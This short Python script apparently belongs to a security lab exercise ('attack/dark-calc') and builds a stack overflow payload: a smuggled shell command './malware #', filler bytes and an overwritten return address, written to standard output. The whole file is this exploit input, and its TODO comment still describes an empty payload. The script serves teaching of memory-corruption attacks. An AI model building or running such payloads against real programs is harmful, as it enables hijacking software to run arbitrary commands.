#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import struct
import sys

command = b"./malware #"
padding = b"A" * (24 - len(command))
return_address = struct.pack("<Q", 0x401A6B)

payload = command + padding + return_address

sys.stdout.buffer.write(payload)
